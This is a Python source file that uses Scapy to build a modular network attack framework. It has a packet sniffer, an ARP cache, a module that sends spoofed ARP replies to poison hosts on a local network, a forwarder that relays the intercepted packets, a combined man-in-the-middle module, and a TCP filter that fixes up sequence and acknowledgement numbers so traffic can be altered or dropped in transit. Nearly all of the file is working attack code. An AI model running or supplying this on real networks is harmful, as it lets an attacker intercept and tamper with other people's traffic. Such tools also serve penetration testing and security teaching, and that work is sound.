# coding: utf-8
"""
Capture and manipulate traffic off the network.

This module provides a Sniffer class and a few "modules" which can be assembled to form attack tools.
These classes are based on Scapy and provide a convenient way to interact with and compose tools from it's functionality.

The advanced functions such as ARP poisonaing, packet forwarding, and analysis are decomposed into modules to allow
for greater flexibility and flexibility. Look at the constructed strategies for examples of how to compose the modules.
"""

import scapy.all as scapy
import enum
import net
import threading
import time
import socket

# Turn off print messages
scapy.conf.verb = 0

class Sniffer:
    """
    Sniffer is the core component of the traffic capture framework.
    This class uses the Scapy sniffer to collect packets off the wire. It then passes them to the modules for processing.
    """
    def __init__(self, iface=None, processor=None, store=False, filter=None, quantum=0.25):
        self.iface = iface
        self.processor = processor
        self.store = store
        self.quantum = quantum
        self.filter = filter

        self.modules = []
        self.packets = []

        self._thread = None
        self._l2socket = None
        self._stopevent = threading.Event()
        self._moduleslock = threading.RLock()
        self._newmodules = []

    def register(self, *mods):
        with self._moduleslock:
            self.modules.extend(mods)
            self._newmodules.extend(mods)

    def process(self, pkt):
        with self._moduleslock:
            for mod in self.modules:
                if mod not in self._newmodules:
                    mod.process(pkt)
        if self.processor is not None:
            self.processor(pkt)

    def run(self):
        try:
            self._l2socket = scapy.conf.L2listen(iface=self.iface, filter=self.filter)

            while not self._stopevent.is_set():
                with self._moduleslock:
                    while self._newmodules:
                        self._newmodules.pop().start(self)

                pkts = self._l2socket.sniff(timeout=self.quantum, prn=self.process, store=self.store)
                self.packets.extend(pkts)
        finally:
            with self._moduleslock:
                for mod in self.modules:
                    mod.stop()

            if self._l2socket is not None:
                self._l2socket.close()
                self._l2socket = None

    def start(self):
        self._stopevent.clear()
        if self._thread is None or not self._thread.is_alive():
            with self._moduleslock:
                self._newmodules = list(self.modules)
            self._thread = threading.Thread(target=self.run, daemon=True)
            self._thread.start()

    def join(self):
        if self._thread is not None:
            self._thread.join()

    def stop(self):
        self._stopevent.set()

    def __enter__(self):
        self.start()
        return self

    def __exit__(self, *args, **kwargs):
        self.stop()

class Module:
    """
    Module is the base for a packet sniffer module.
    Implementaions of Module provide a discrete functionality towards complex packet analysis and manipulation.
    """
    def start(self, sniffer):
        """
        Start will be called when the sniffer starts
        """
        pass

    def process(self, pkt):
        """
        Process will be called for every packet recieved by the sniffer
        """
        pass

    def stop(self):
        """
        Stop will be called when the sniffer stops
        """
        pass

class ArpCacheModule(Module):
    """
    ArpCacheModule provides a cache of the ARP associations provided by other hosts.
    It ignores ARP messages sent from this host and any other hosts specified in ``ignore``.
    """
    def __init__(self, ignore=None):
        self.sniffer = None
        self.ignore = set() if ignore is None else set(ignore)
        self.cache = {}

    def start(self, sniffer):
        self.sniffer = sniffer
        if self.sniffer.iface is not None:
            self.ignore.add(str(net.ifhwaddr(self.sniffer.iface)))

    def process(self, pkt):
        if scapy.Ether in pkt and scapy.ARP in pkt:
            src = pkt[scapy.Ether].src
            if src != '00:00:00:00:00:00' and src not in self.ignore:
                psrc = pkt[scapy.ARP].psrc
                if psrc != '0.0.0.0':
                    self.cache[psrc] = src

class ArpPoisonerModule(Module):
    """
    ArpPoisonerModule will send out spoofed ARP messages at regular intervals to poison the network.
    It also starts by sending out an arping to all targets to see who is on the network and populate the cache.
    """
    def __init__(self, arpcache, iface=None, hwaddr=None, target=None, impersonate=None, interval=1):
        self.arpcache = arpcache
        self.iface = iface
        self.interval = interval
        self.hwaddr = hwaddr
        self.target = target
        self.impersonate = impersonate

        self.sniffer = None

        self._stopevent = threading.Event()
        self._thread = None

    @staticmethod
    def enumerate(net):
        if isinstance(net, str):
            net = scapy.Net(net)
        return net

    def arping(self, target=None):
        # Figure out who we are trying to resolve
        if target is None:
            if self.target is None or self.impersonate is None:
                pdst = net.ifcidr(self.iface)
            else:
                # It has to be a list because scapy can be really cool, but also kinda wonky
                pdst = list(set(self.enumerate(self.target)) | set(self.enumerate(self.target)))
        else:
            pdst = target

        # Send out an arp "who-has" requests
        pkts = scapy.Ether(src=self.hwaddr, dst='ff:ff:ff:ff:ff:ff')/scapy.ARP(op='who-has', hwsrc=self.hwaddr, pdst=pdst)
        scapy.sendp(pkts, iface=self.iface)

    def arpoison(self, target=None, impersonate=None):
        # Chose the target and impersonation lists
        impersonate = impersonate or self.impersonate or net.ifcidr(self.iface)
        target = target or self.target or net.ifcidr(self.iface)
        ifaddr = str(net.ifaddr(self.iface))

        # Filter out targets and impersonations not in our ARP cache
        pdst = [ip for ip in self.enumerate(target) if ip in self.arpcache]
        psrc = [ip for ip in self.enumerate(impersonate) if ip in self.arpcache]

        if pdst:
            # Build the packet list and filter out packets that would be sent to the true ip owner
            pkts = [scapy.Ether(src=self.hwaddr, dst=self.arpcache[ip])/scapy.ARP(op=['who-has', 'is-at'], hwsrc=self.hwaddr, psrc=psrc, pdst=ip) for ip in pdst]
            pkts = [p for p in pkts if p.psrc != p.pdst and p.dst != ifaddr]

            # Launch the payload
            scapy.sendp(pkts, iface=self.iface)

    def run(self):
        if self.hwaddr is None:
            self.hwaddr =  str(net.ifhwaddr(self.iface))

        self.arping()
        while not self._stopevent.is_set():
            self.arpoison()
            time.sleep(self.interval)

    def start(self, sniffer):
        self._stopevent.clear()
        self.sniffer = sniffer
        if self.iface is None:
            self.iface = self.sniffer.iface

        if self._thread is None or not self._thread.is_alive():
            self._thread = threading.Thread(target=self.run, daemon=True)
            self._thread.start()

    def stop(self):
        self._stopevent.set()

class ForwarderModule(Module):
    """
    ForwarderModule forwards packets received by the sniffer and in the ARP cache, after applying a filter.
    This serves to forward on packets intercepted, such as by ARP poisoning, onto the intended hosts.
    The filter function should return one packet, a list of packets, or None.
    Returned packets will be sent after having their eithernet addresses set.
    """
    def __init__(self, arpcache, filter=None, iface=None, hwaddr=None):
        self.arpcache = arpcache
        self.filter = filter
        self.iface = iface
        self.hwaddr = hwaddr
        self.sniffer = None

    def start(self, sniffer):
        self.sniffer = sniffer

        if self.iface is None:
            self.iface = sniffer.iface
        if self.hwaddr is None:
            self.hwaddr = str(net.ifhwaddr(self.iface))

    def process(self, pkt):
        if scapy.IP in pkt and scapy.Ether in pkt:
            if pkt[scapy.Ether].dst == self.hwaddr and pkt[scapy.Ether].src != self.hwaddr:
                if pkt[scapy.IP].dst in self.arpcache:
                    pkt = pkt.copy()
                    pkt[scapy.Ether].dst = self.arpcache[pkt[scapy.IP].dst]

                    # After having patched the dst MAC, but before patching the src, apply the filter
                    if self.filter is not None:
                        pkt = self.filter(pkt)

                    if pkt is not None:
                        pkt[scapy.Ether].src = self.hwaddr
                        scapy.sendp(pkt, iface=self.iface)

class ArpMitmModule(Module):
    def __init__(self, filter=None, iface=None, hwaddr=None):
        self.cache = ArpCacheModule(ignore=[hwaddr])
        self.poisoner = ArpPoisonerModule(self.cache.cache, iface=iface, hwaddr=hwaddr)
        self.forwarder = ForwarderModule(self.cache.cache, filter=filter, iface=iface, hwaddr=hwaddr)
        self.submodules = (self.cache, self.poisoner, self.forwarder)
        self.sniffer = None

    def start(self, sniffer):
        self.sniffer = sniffer
        for mod in self.submodules:
            mod.start(sniffer)

    def process(self, pkt):
        for mod in self.submodules:
            mod.process(pkt)

    def stop(self):
        for mod in self.submodules:
            mod.stop()

class TcpFlags(enum.IntEnum):
    FIN = 0x01
    SYN = 0x02
    RST = 0x04
    PSH = 0x08
    ACK = 0x10
    URG = 0x20
    ECE = 0x40
    CWR = 0x80

class TcpFlowKey:
    @classmethod
    def frompkt(cls, pkt):
        ip, tcp = pkt[scapy.IP], pkt[scapy.TCP]
        return cls(ip.src, tcp.sport, ip.dst, tcp.dport)

    def __init__(self, src, sport, dst, dport):
        self.src = src
        self.sport = sport
        self.dst = dst
        self.dport = dport

    def inverse(self):
        return self.__class__(self.dst, self.dport, self.src, self.sport)

    def __hash__(self):
        return hash((self.src, self.sport, self.dst, self.dport))

    def __eq__(self, other):
        return all((
            isinstance(other, self.__class__),
            self.src == other.src,
            self.sport == other.sport,
            self.dst == other.dst,
            self.dport == other.dport
        ))

class TcpFilter:
    """
    TcpFilter wraps a packet filter and adjusts seq and ack numbers to account for altered data lengths
    The wrapped filter should not change the seq or ack number, as they wil be reset
    The wrapped filter may drop a packet by returning None in which case nothing will be forwarded
    """
    def __init__(self, filter=None):
        if filter is not None:
            self.filter = filter
        self.offsets = {}

    class Offset:
        def __init__(self):
            self.list = []

        def getseq(self, seq):
            offset = 0
            for curr in self.list:
                if curr[0] < seq:
                    offset += curr[1]
                else:
                    break
            return seq + offset

        def getack(self, ack):
            for curr in self.list:
                if curr[0] < ack:
                    ack -= curr[1]
                else:
                    break
            return ack

        def add(self, seq, diff):
            """Add a new entry to the list to account for diff bytes added at seq"""
            # Insert into sorted list using linear search because it will almost always be the front
            new = (seq, diff)
            for i, curr in enumerate(reversed(self.list)):
                if new > curr:
                    self.list.insert(len(self.list) - i, new)
                    break
            else:
                self.list.insert(0, new)

    def filter(self, pkt):
        """filter should be overriden if TcpFilter is subclassed"""
        return pkt

    def __call__(self, pkt):
        if all(layer in pkt for layer in (scapy.Ether, scapy.IP, scapy.TCP)):
            seq, ack = pkt[scapy.TCP].seq, pkt[scapy.TCP].ack

            key = TcpFlowKey.frompkt(pkt)
            if pkt[scapy.TCP].flags & TcpFlags.SYN or key not in self.offsets:
                self.offsets[key] = self.Offset()
            offset = self.offsets[key]

            before = len(pkt[scapy.Raw].load) if scapy.Raw in pkt else 0
            pkt = self.filter(pkt)
            if pkt is None:
                # The packet, and its data, was dropped
                offset.add(seq, -before)
            else:
                after = len(pkt[scapy.Raw].load) if scapy.Raw in pkt else 0
                diff = after - before
                if diff != 0:
                    offset.add(seq, diff)

                pkt[scapy.TCP].seq = offset.getseq(seq)

                inverse_key = key.inverse()
                if pkt[scapy.TCP].flags & TcpFlags.ACK and inverse_key in self.offsets:
                    pkt[scapy.TCP].ack = self.offsets[inverse_key].getack(ack)

                # Force checksum recalculation
                pkt[scapy.IP].len += diff
                del pkt[scapy.TCP].chksum
                del pkt[scapy.IP].chksum

            return pkt

def tcpfilter(filter):
    return TcpFilter(filter)
